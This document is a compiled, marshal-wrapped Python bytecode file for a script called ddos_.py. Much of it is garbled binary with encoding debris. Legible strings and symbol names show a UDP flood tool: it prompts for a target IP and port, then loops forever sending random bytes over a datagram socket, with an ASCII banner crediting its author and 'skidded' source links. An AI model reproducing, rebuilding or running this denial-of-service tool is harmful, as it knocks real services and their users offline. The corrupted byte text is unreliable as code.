ï¿½
bï¿½t_c�����������@���s!���d��d�l��Z��e��j�d�ï¿½�d�Ud�S(���iï¿½ï¿½ï¿½ï¿½Nsï¿½��c�����������@���s<��d��d�l��Z��d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�m�Z�e�j�ï¿½��Z�e�j�Z�e�j�Z�e�j	�Z	�e�j
�Z
�e�j�Z�e�j�e�j�e�j
�ï¿½�Z�e�j�d�ï¿½�Z�e�j�d�ï¿½�d�GHd�GHd�GHd�GHd	�GHd
�GHd�GHd�GHd�GHd�GHd
�GHd�GHe�d�ï¿½�Z�e�d�ï¿½�Z�e�j�d�ï¿½�d�GHe�j�d�ï¿½�e�j�d�ï¿½�d�GHe�j�d�ï¿½�e�j�d�ï¿½�d�GHe�j�d�ï¿½�e�j�d�ï¿½�d�GHe�j�d�ï¿½�e�j�d�ï¿½�d�GHe�j�d�ï¿½�e�j�d�ï¿½�d�GHe�j�d�ï¿½�e�j�d�ï¿½�d�Z�x[�e�r7e�j�e�e�e�f�ï¿½�e�d�Z�e�d�Z�d�e�e�e�f�GHe�d�k�rï¿½d�Z�qï¿½qï¿½Wd�S(���iï¿½ï¿½ï¿½ï¿½N(���t���datetimeiï¿½��t���clearsï¿½��[1;31m
made by murk                                       /$$             /$$
                                  | $$            | $$
 /$$$$$$/$$$$  /$$   /$$  /$$$$$$ | $$   /$$  /$$$$$$$
| $$_  $$_  $$| $$  | $$ /$$__  $$| $$  /$$/ /$$__  $$
| $$ \ $$ \ $$| $$  | $$| $$  \__/| $$$$$$/ | $$  | $$
| $$ | $$ | $$| $$  | $$| $$      | $$_  $$ | $$  | $$
| $$ | $$ | $$|  $$$$$$/| $$      | $$ \  $$|  $$$$$$$
|__/ |__/ |__/ \______/ |__/      |__/  \__/ \_______/
                                                      
                                                      
                                                      s@���[41m[1;37m  Distributed Denial of Dildos- tools  [0mt��� s%���[1;33mAuthor   : [1;37murk764 s8���[1;33mGithub   : [1;37mhttps://github.com/ihateskidsdotcom s=���[1;33mSource   : [1;37mhttps://github.com/VRCHS/Panel-I-skidded s#���[1;32mPress CTRL+C to stop sendings���[1;37m------------ [0ms���[1;37mINPUT TARGET [0ms$���[37m[*] [91mIP or HOSTNAME :[32m s$���[37m[*] [91mPORT SCANNING  :[32m s��� Run DDOS Attack.i���s��� Preparing DDoS Attack..s��� Run DDOS Attack...i����s%���Sent %s packet to %s throught port:%siï¿½ï¿½��(���t���syst���ost���timet���sockett���randomR����t���nowt���hourt���minutet���dayt���montht���yeart���AF_INETt
���SOCK_DGRAMt���sockt���_urandomt���bytest���systemt	���raw_inputt���ipt���inputt���portt���sleept���sentt���Truet���sendto(����(����(����t����t���<module>���sn���					
	












	

(���t���marshalt���loads(����(����(����s���ddos_.pyt���<module>���s���
